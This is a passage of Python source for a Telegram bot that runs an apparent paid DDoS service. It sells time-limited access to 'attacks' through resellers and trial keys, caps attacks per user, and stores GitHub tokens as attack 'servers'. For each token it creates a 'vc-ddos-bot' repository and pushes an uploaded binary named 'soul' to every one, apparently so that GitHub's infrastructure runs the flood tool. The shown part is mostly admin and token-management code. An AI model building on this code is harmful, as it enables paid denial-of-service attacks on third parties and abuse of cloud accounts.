    if not (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "This command is only for admins/resellers."
        )
        return
    
    if not approved_users:
        await update.message.reply_text("📭 No approved users")
        return
    
    users_list = "👤 **𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐔𝐒𝐄𝐑𝐒 𝐋𝐈𝐒𝐓**\n────────────────────\n"
    count = 1
    for uid, user_info in approved_users.items():
        username = user_info.get('username', f'user_{uid}')
        days = user_info.get('days', '?')
        
        # Calculate remaining time
        expiry = user_info.get('expiry', 'LIFETIME')
        if expiry == "LIFETIME":
            remaining = "LIFETIME"
        else:
            try:
                expiry_time = float(expiry)
                current_time = time.time()
                if current_time > expiry_time:
                    remaining = "EXPIRED"
                else:
                    days_left = int((expiry_time - current_time) / (24 * 3600))
                    hours_left = int(((expiry_time - current_time) % (24 * 3600)) / 3600)
                    remaining = f"{days_left}d {hours_left}h"
            except:
                remaining = "Unknown"
        
        users_list += f"{count}. `{uid}` - @{username} ({days} days) | Remaining: {remaining}\n"
        count += 1
    
    users_list += f"\n📊 **𝐓𝐎𝐓𝐀𝐋 𝐔𝐒𝐄𝐑𝐒:** {len(approved_users)}\n"
    users_list += "✅ **𝐓𝐇𝐄𝐒𝐄 𝐔𝐒𝐄𝐑𝐒 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐁𝐎𝐓 𝐈𝐍 𝐃𝐌**"
    await update.message.reply_text(users_list)

async def approveuserslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "This command is only for admins."
        )
        return
    
    if not pending_users:
        await update.message.reply_text("📭 No pending requests")
        return
    
    pending_list = "⏳ **𝐏𝐄𝐍𝐃𝐈𝐍𝐆 𝐑𝐄𝐐𝐔𝐄𝐒𝐓𝐒**\n────────────────────\n"
    for user in pending_users:
        pending_list += f"• `{user['user_id']}` - @{user['username']}\n"
    
    pending_list += f"\nTo approve: /add <id> <days>"
    await update.message.reply_text(pending_list)

async def ownerlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "This command is only for admins."
        )
        return
    
    owners_list = "👑 **𝐎𝐖𝐍𝐄𝐑𝐒 𝐋𝐈𝐒𝐓**\n────────────────────\n"
    for owner_id, owner_info in owners.items():
        username = owner_info.get('username', f'owner_{owner_id}')
        is_primary = owner_info.get('is_primary', False)
        added_by = owner_info.get('added_by', 'System')
        owners_list += f"• `{owner_id}` - @{username}"
        if is_primary:
            owners_list += " 👑 (Primary)"
        owners_list += f"\n  Added by: `{added_by}`\n"
    
    await update.message.reply_text(owners_list)

async def adminlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "This command is only for admins."
        )
        return
    
    if not admins:
        await update.message.reply_text("📭 No admins")
        return
    
    admins_list = "🛡️ **𝐀𝐃𝐌𝐈𝐍𝐒 𝐋𝐈𝐒𝐓**\n────────────────────\n"
    for admin_id, admin_info in admins.items():
        username = admin_info.get('username', f'admin_{admin_id}')
        admins_list += f"• `{admin_id}` - @{username}\n"
    
    await update.message.reply_text(admins_list)

async def resellerlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "This command is only for admins."
        )
        return
    
    if not resellers:
        await update.message.reply_text("📭 No resellers")
        return
    
    resellers_list = "💰 **𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑𝐒 𝐋𝐈𝐒𝐓**\n────────────────────\n"
    for reseller_id, reseller_info in resellers.items():
        username = reseller_info.get('username', f'reseller_{reseller_id}')
        credits = reseller_info.get('credits', 0)
        expiry = reseller_info.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                expiry = expiry_date
            except:
                pass
        resellers_list += f"• `{reseller_id}` - @{username}\n  Credits: {credits} | Expiry: {expiry}\n"
    
    await update.message.reply_text(resellers_list)

async def pricelist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💰 **𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓**\n"
        "────────────────────\n"
        "• 1 day - ₹120\n"
        "• 2 days - ₹240\n"
        "• 3 days - ₹360\n"
        "• 4 days - ₹450\n"
        "• 7 days - ₹650\n"
        "────────────────────\n"
        "Contact admin for access"
    )

async def resellerpricelist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💰 **𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓**\n"
        "────────────────────\n"
        "• 1 day - ₹150\n"
        "• 2 days - ₹250\n"
        "• 3 days - ₹300\n"
        "• 4 days - ₹400\n"
        "• 7 days - ₹550\n"
        "────────────────────\n"
        "Contact owner for reseller access"
    )

async def listgrp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "This command is only for admins."
        )
        return
    
    if not groups:
        await update.message.reply_text("📭 No groups")
        return
    
    groups_list = "👥 **𝐆𝐑𝐎𝐔𝐏𝐒 𝐋𝐈𝐒𝐓**\n────────────────────\n"
    for group_id, group_info in groups.items():
        groups_list += f"• `{group_id}` - {group_info.get('name', 'Unknown')}\n"
    
    await update.message.reply_text(groups_list)

# ========== MAINTENANCE COMMAND ==========
async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only owners can set maintenance mode."
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ **𝐖𝐑𝐎𝐍𝐆 𝐒𝐘𝐍𝐓𝐀𝐗**\n"
            "────────────────────\n"
            "Syntax: /maintenance <on/off>\n"
            "Example: /maintenance on"
        )
        return
    
    mode = context.args[0].lower()
    global MAINTENANCE_MODE
    
    if mode == "on":
        MAINTENANCE_MODE = True
        save_maintenance_mode(True)
        await update.message.reply_text(
            "🔧 **𝐌𝐀𝐈𝐍𝐓𝐄𝐍𝐀𝐍𝐂𝐄 𝐌𝐎𝐃𝐄 𝐎𝐍**\n"
            "────────────────────\n"
            "Bot is now in maintenance mode.\n"
            "Only admins can use."
        )
    elif mode == "off":
        MAINTENANCE_MODE = False
        save_maintenance_mode(False)
        await update.message.reply_text(
            "✅ **𝐌𝐀𝐈𝐍𝐓𝐄𝐍𝐀𝐍𝐂𝐄 𝐌𝐎𝐃𝐄 𝐎𝐅𝐅**\n"
            "────────────────────\n"
            "Bot is now available for all users."
        )
    else:
        await update.message.reply_text("❌ Wrong mode. Use 'on' or 'off'")

# ========== SET COOLDOWN COMMAND ==========
async def setcooldown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only owners can set cooldown."
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ **𝐖𝐑𝐎𝐍𝐆 𝐒𝐘𝐍𝐓𝐀𝐗**\n"
            "────────────────────\n"
            "Syntax: /setcooldown <seconds>\n"
            "Example: /setcooldown 300"
        )
        return
    
    try:
        new_cooldown = int(context.args[0])
        if new_cooldown < 10:
            await update.message.reply_text("❌ Cooldown must be at least 10 seconds")
            return
        
        global COOLDOWN_DURATION
        COOLDOWN_DURATION = new_cooldown
        save_cooldown(new_cooldown)
        
        await update.message.reply_text(
            f"✅ **𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐔𝐏𝐃𝐀𝐓𝐄𝐃**\n"
            "────────────────────\n"
            f"New cooldown: `{COOLDOWN_DURATION}` seconds"
        )
    except ValueError:
        await update.message.reply_text("❌ Wrong number")

# ========== SET MAX ATTACKS COMMAND ==========
async def setmaxattack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only owners can set max attacks."
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ **𝐖𝐑𝐎𝐍𝐆 𝐒𝐘𝐍𝐓𝐀𝐗**\n"
            "────────────────────\n"
            "Syntax: /setmaxattack <number>\n"
            "Example: /setmaxattack 2000"
        )
        return
    
    try:
        max_attacks = int(context.args[0])
        if max_attacks < 1 or max_attacks > 10000:
            await update.message.reply_text("❌ Max attacks must be between 1 and 10000")
            return
        
        global MAX_ATTACKS
        MAX_ATTACKS = max_attacks
        save_max_attacks(max_attacks)
        
        await update.message.reply_text(
            f"✅ **𝐌𝐀𝐗 𝐀𝐓𝐓𝐀𝐂𝐊𝐒 𝐔𝐏𝐃𝐀𝐓𝐄𝐃**\n"
            "────────────────────\n"
            f"New limit: `{MAX_ATTACKS}` attacks per user"
        )
    except ValueError:
        await update.message.reply_text("❌ Wrong number")

# ========== GENERATE TRIAL KEY COMMAND ==========
async def gentrailkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "This command is only for admins."
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ **𝐖𝐑𝐎𝐍𝐆 𝐒𝐘𝐍𝐓𝐀𝐗**\n"
            "────────────────────\n"
            "Syntax: /gentrailkey <hours>\n"
            "Example: /gentrailkey 24"
        )
        return
    
    try:
        hours = int(context.args[0])
        if hours < 1 or hours > 720:  # Max 30 days
            await update.message.reply_text("❌ Hours must be between 1 and 720 (30 days)")
            return
        
        key = generate_trial_key(hours)
        
        await update.message.reply_text(
            f"🔑 **𝐓𝐑𝐈𝐀𝐋 𝐊𝐄𝐘 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄𝐃**\n"
            "────────────────────\n"
            f"Key: `{key}`\n"
            f"Duration: {hours} hours\n"
            f"Expires: in {hours} hours\n\n"
            "Users can redeem it:\n"
            f"`/redeem {key}`"
        )
        
    except ValueError:
        await update.message.reply_text("❌ Wrong number")

# ========== REMOVE EXPIRED TOKENS COMMAND ==========
async def removexpiredtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only owners can remove expired tokens."
        )
        return
    
    # Check GitHub tokens for validity
    valid_tokens = []
    expired_tokens = []
    
    for token_data in github_tokens:
        try:
            g = Github(token_data['token'])
            user = g.get_user()
            # If we can get user info, token is valid
            _ = user.login
            valid_tokens.append(token_data)
        except:
            expired_tokens.append(token_data)
    
    if not expired_tokens:
        await update.message.reply_text("✅ All tokens are valid.")
        return
    
    # Save only valid tokens
    github_tokens.clear()
    github_tokens.extend(valid_tokens)
    save_github_tokens(github_tokens)
    
    expired_list = "🗑️ **𝐄𝐗𝐏𝐈𝐑𝐄𝐃 𝐓𝐎𝐊𝐄𝐍𝐒 𝐑𝐄𝐌𝐎𝐕𝐄𝐃:**\n────────────────────\n"
    for token in expired_tokens:
        expired_list += f"• `{token['username']}` - {token['repo']}\n"
    
    expired_list += f"\n📊 **𝐑𝐄𝐌𝐀𝐈𝐍𝐈𝐍𝐆 𝐓𝐎𝐊𝐄𝐍𝐒:** {len(valid_tokens)}"
    await update.message.reply_text(expired_list)

# ========== EXISTING BROADCAST COMMAND ==========
async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only owners can send broadcast."
        )
        return
    
    await update.message.reply_text(
        "📢 **𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐌𝐄𝐒𝐒𝐀𝐆𝐄**\n"
        "────────────────────\n"
        "Please send the message you want to broadcast:"
    )
    
    return WAITING_FOR_BROADCAST

async def broadcast_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("🚫 Unauthorized")
        return ConversationHandler.END
    
    message = update.message.text
    await send_broadcast(update, context, message)
    return ConversationHandler.END

async def send_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, message: str):
    # Get all users
    all_users = set()
    
    # Add approved users
    for user_id in approved_users.keys():
        all_users.add(int(user_id))
    
    # Add resellers
    for user_id in resellers.keys():
        all_users.add(int(user_id))
    
    # Add admins
    for user_id in admins.keys():
        all_users.add(int(user_id))
    
    # Add owners
    for user_id in owners.keys():
        all_users.add(int(user_id))
    
    total_users = len(all_users)
    success_count = 0
    fail_count = 0
    
    progress_msg = await update.message.reply_text(
        f"📢 **𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓...**\n"
        f"Total Users: {total_users}"
    )
    
    for user_id in all_users:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"📢 **𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓**\n────────────────────\n{message}"
            )
            success_count += 1
            time.sleep(0.1)
        except:
            fail_count += 1
    
    await progress_msg.edit_text(
        f"✅ **𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄**\n"
        "────────────────────\n"
        f"• ✅ Success: {success_count}\n"
        f"• ❌ Failed: {fail_count}\n"
        f"• 📊 Total: {total_users}\n"
        f"• 📝 Message: {message[:50]}..."
    )

# ========== OWNER MANAGEMENT ==========
async def addowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_primary_owner(user_id):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only primary owners can add new owners."
        )
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "👑 **𝐀𝐃𝐃 𝐎𝐖𝐍𝐄𝐑**\n"
            "────────────────────\n"
            "Syntax: /addowner <user_id> <username>\n"
            "Example: /addowner 12345678 johndoe"
        )
        return
    
    try:
        new_owner_id = int(context.args[0])
        username = context.args[1]
        
        if str(new_owner_id) in owners:
            await update.message.reply_text("❌ This user is already an owner")
            return
        
        # Add to owners
        owners[str(new_owner_id)] = {
            "username": username,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "is_primary": False
        }
        save_owners(owners)
        
        # Remove from other lists if present
        if str(new_owner_id) in admins:
            del admins[str(new_owner_id)]
            save_admins(admins)
        
        if str(new_owner_id) in resellers:
            del resellers[str(new_owner_id)]
            save_resellers(resellers)
        
        # Notify new owner
        try:
            await context.bot.send_message(
                chat_id=new_owner_id,
                text="👑 **𝐂𝐎𝐍𝐆𝐑𝐀𝐓𝐔𝐋𝐀𝐓𝐈𝐎𝐍𝐒!**\n────────────────────\nYou have been made owner of CLOUD POWERD Bot!\nNow you can access all admin features."
            )
        except:
            pass
        
        await update.message.reply_text(
            f"✅ **𝐎𝐖𝐍𝐄𝐑 𝐀𝐃𝐃𝐄𝐃**\n"
            "────────────────────\n"
            f"Owner ID: `{new_owner_id}`\n"
            f"Username: @{username}\n"
            f"Added by: `{user_id}`"
        )
        
    except ValueError:
        await update.message.reply_text("❌ Wrong user ID")

async def deleteowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_primary_owner(user_id):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only primary owners can delete owners."
        )
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "🗑️ **𝐃𝐄𝐋𝐄𝐓𝐄 𝐎𝐖𝐍𝐄𝐑**\n"
            "────────────────────\n"
            "Syntax: /deleteowner <user_id>\n"
            "Example: /deleteowner 12345678"
        )
        return
    
    try:
        owner_to_remove = int(context.args[0])
        
        if str(owner_to_remove) not in owners:
            await update.message.reply_text("❌ This user is not an owner")
            return
        
        # Check if trying to remove primary owner
        if owners[str(owner_to_remove)].get("is_primary", False):
            await update.message.reply_text("❌ Cannot delete primary owner")
            return
        
        # Remove owner
        removed_username = owners[str(owner_to_remove)].get("username", "")
        del owners[str(owner_to_remove)]
        save_owners(owners)
        
        # Notify removed owner
        try:
            await context.bot.send_message(
                chat_id=owner_to_remove,
                text="🚫 **𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍**\n────────────────────\nYour owner access has been removed."
            )
        except:
            pass
        
        await update.message.reply_text(
            f"✅ **𝐎𝐖𝐍𝐄𝐑 𝐃𝐄𝐋𝐄𝐓𝐄𝐃**\n"
            "────────────────────\n"
            f"Owner ID: `{owner_to_remove}`\n"
            f"Username: @{removed_username}\n"
            f"Deleted by: `{user_id}`"
        )
        
    except ValueError:
        await update.message.reply_text("❌ Wrong user ID")

# ========== RESELLER MANAGEMENT ==========
async def addreseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only owners can add resellers."
        )
        return
    
    if len(context.args) < 3:
        await update.message.reply_text(
            "💰 **𝐀𝐃𝐃 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑**\n"
            "────────────────────\n"
            "Syntax: /addreseller <user_id> <credits> <username>\n"
            "Example: /addreseller 12345678 100 johndoe"
        )
        return
    
    try:
        reseller_id = int(context.args[0])
        credits = int(context.args[1])
        username = context.args[2]
        
        if str(reseller_id) in resellers:
            await update.message.reply_text("❌ This user is already a reseller")
            return
        
        # Add reseller with credits
        resellers[str(reseller_id)] = {
            "username": username,
            "credits": credits,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": "LIFETIME",
            "total_added": 0
        }
        save_resellers(resellers)
        
        # Notify reseller
        try:
            await context.bot.send_message(
                chat_id=reseller_id,
                text=f"💰 **𝐂𝐎𝐍𝐆𝐑𝐀𝐓𝐔𝐋𝐀𝐓𝐈𝐎𝐍𝐒!**\n────────────────────\nYou have been made reseller of CLOUD POWERD Bot!\nInitial credits: {credits}\n\nNow you can add users using /add command."
            )
        except:
            pass
        
        await update.message.reply_text(
            f"✅ **𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐀𝐃𝐃𝐄𝐃**\n"
            "────────────────────\n"
            f"Reseller ID: `{reseller_id}`\n"
            f"Username: @{username}\n"
            f"Credits: {credits}\n"
            f"Added by: `{user_id}`"
        )
        
    except ValueError:
        await update.message.reply_text("❌ Wrong user ID or credits")

async def removereseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only owners can remove resellers."
        )
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "🗑️ **𝐑𝐄𝐌𝐎𝐕𝐄 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑**\n"
            "────────────────────\n"
            "Syntax: /removereseller <user_id>\n"
            "Example: /removereseller 12345678"
        )
        return
    
    try:
        reseller_to_remove = int(context.args[0])
        
        if str(reseller_to_remove) not in resellers:
            await update.message.reply_text("❌ This user is not a reseller")
            return
        
        # Remove reseller
        removed_username = resellers[str(reseller_to_remove)].get("username", "")
        del resellers[str(reseller_to_remove)]
        save_resellers(resellers)
        
        # Notify removed reseller
        try:
            await context.bot.send_message(
                chat_id=reseller_to_remove,
                text="🚫 **𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍**\n────────────────────\nYour reseller access has been removed."
            )
        except:
            pass
        
        await update.message.reply_text(
            f"✅ **𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐑𝐄𝐌𝐎𝐕𝐄𝐃**\n"
            "────────────────────\n"
            f"Reseller ID: `{reseller_to_remove}`\n"
            f"Username: @{removed_username}\n"
            f"Removed by: `{user_id}`"
        )
        
    except ValueError:
        await update.message.reply_text("❌ Wrong user ID")

# ========== TOKEN MANAGEMENT ==========
async def addtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only owners can add tokens."
        )
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ **𝐖𝐑𝐎𝐍𝐆 𝐒𝐘𝐍𝐓𝐀𝐗**\n"
            "────────────────────\n"
            "Syntax: /addtoken <github_token>"
        )
        return
    
    token = context.args[0]
    repo_name = "vc-ddos-bot"
    
    try:
        for existing_token in github_tokens:
            if existing_token['token'] == token:
                await update.message.reply_text("❌ This token already exists")
                return
        
        g = Github(token)
        user = g.get_user()
        username = user.login
        
        repo, created = create_repository(token, repo_name)
        
        new_token_data = {
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
            'status': 'active'
        }
        github_tokens.append(new_token_data)
        save_github_tokens(github_tokens)
        
        if created:
            message = (
                f"✅ **𝐍𝐄𝐖 𝐑𝐄𝐏𝐎𝐒𝐈𝐓𝐎𝐑𝐘 𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐀𝐍𝐃 𝐓𝐎𝐊𝐄𝐍 𝐀𝐃𝐃𝐄𝐃!**\n"
                "────────────────────\n"
                f"👤 Username: `{username}`\n"
                f"📁 Repository: `{repo_name}`\n"
                f"📊 Total Servers: {len(github_tokens)}"
            )
        else:
            message = (
                f"✅ **𝐓𝐎𝐊𝐄𝐍 𝐀𝐃𝐃𝐄𝐃 𝐓𝐎 𝐄𝐗𝐈𝐒𝐓𝐈𝐍𝐆 𝐑𝐄𝐏𝐎𝐒𝐈𝐓𝐎𝐑𝐘!**\n"
                "────────────────────\n"
                f"👤 Username: `{username}`\n"
                f"📁 Repository: `{repo_name}`\n"
                f"📊 Total Servers: {len(github_tokens)}"
            )
        
        await update.message.reply_text(message)
        
    except Exception as e:
        await update.message.reply_text(f"❌ **𝐄𝐑𝐑𝐎𝐑**\n────────────────────\n{str(e)}\nPlease check token.")

async def tokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only owners can view tokens."
        )
        return
    
    if not github_tokens:
        await update.message.reply_text("📭 No tokens added")
        return
    
    tokens_list = "🔑 **𝐒𝐄𝐑𝐕𝐄𝐑𝐒 𝐋𝐈𝐒𝐓:**\n────────────────────\n"
    for i, token_data in enumerate(github_tokens, 1):
        tokens_list += f"{i}. 👤 `{token_data['username']}`\n   📁 `{token_data['repo']}`\n\n"
    
    tokens_list += f"📊 **𝐓𝐎𝐓𝐀𝐋 𝐒𝐄𝐑𝐕𝐄𝐑𝐒:** {len(github_tokens)}"
    await update.message.reply_text(tokens_list)

async def removetoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only owners can remove tokens."
        )
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ **𝐖𝐑𝐎𝐍𝐆 𝐒𝐘𝐍𝐓𝐀𝐗**\n"
            "────────────────────\n"
            "Syntax: /removetoken <number>"
        )
        return
    
    try:
        token_num = int(context.args[0])
        if token_num < 1 or token_num > len(github_tokens):
            await update.message.reply_text(f"❌ Wrong number. Use 1-{len(github_tokens)}")
            return
        
        removed_token = github_tokens.pop(token_num - 1)
        save_github_tokens(github_tokens)
        
        await update.message.reply_text(
            f"✅ **𝐒𝐄𝐑𝐕𝐄𝐑 𝐑𝐄𝐌𝐎𝐕𝐄𝐃!**\n"
            "────────────────────\n"
            f"👤 Server: `{removed_token['username']}`\n"
            f"📁 Repository: `{removed_token['repo']}`\n"
            f"📊 Remaining: {len(github_tokens)}"
        )
        
    except ValueError:
        await update.message.reply_text("❌ Wrong number")

# ========== BINARY UPLOAD ==========
async def binary_upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only owners can upload binary."
        )
        return ConversationHandler.END
    
    if not github_tokens:
        await update.message.reply_text(
            "❌ **𝐍𝐎 𝐒𝐄𝐑𝐕𝐄𝐑𝐒 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄**\n"
            "────────────────────\n"
            "No servers added. First use /addtoken."
        )
        return ConversationHandler.END
    
    await update.message.reply_text(
        "📤 **𝐁𝐈𝐍𝐀𝐑𝐘 𝐔𝐏𝐋𝐎𝐀𝐃**\n"
        "────────────────────\n"
        "Please send your binary file...\n"
        "This file will be uploaded to all GitHub repositories as `soul`."
    )
    
    return WAITING_FOR_BINARY

async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("🚫 Unauthorized")
        return ConversationHandler.END
    
    if not update.message.document:
        await update.message.reply_text("❌ Please send file, not text")
        return WAITING_FOR_BINARY
    
    progress_msg = await update.message.reply_text("📥 **𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐈𝐍𝐆 𝐘𝐎𝐔𝐑 𝐁𝐈𝐍𝐀𝐑𝐘 𝐅𝐈𝐋𝐄...**")
    
    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'rb') as f:
            binary_content = f.read()
        
        file_size = len(binary_content)
        
        await progress_msg.edit_text(
            f"📊 **𝐅𝐈𝐋𝐄 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃: {file_size} 𝐁𝐘𝐓𝐄𝐒**\n"
            "────────────────────\n"
            "📤 Uploading to all GitHub repositories..."
        )
        
        success_count = 0
        fail_count = 0
        results = []
        
        def upload_to_repo(token_data):
            try:
                g = Github(token_data['token'])
                repo = g.get_repo(token_data['repo'])
                
                try:
                    existing_file = repo.get_contents(BINARY_FILE_NAME)
                    repo.update_file(
                        BINARY_FILE_NAME,
                        "Update binary file",
                        binary_content,
                        existing_file.sha,
                        branch="main"
                    )
                    results.append((token_data['username'], True, "Updated"))
                except Exception as e:
                    repo.create_file(
                        BINARY_FILE_NAME,
                        "Upload binary file", 
                        binary_content,
                        branch="main"
                    )
                    results.append((token_data['username'], True, "Created"))
                    
            except Exception as e:
                results.append((token_data['username'], False, str(e)))
        
        threads = []
        for token_data in github_tokens:
            thread = threading.Thread(target=upload_to_repo, args=(token_data,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        for username, success, status in results:
            if success:
                success_count += 1
            else:
                fail_count += 1
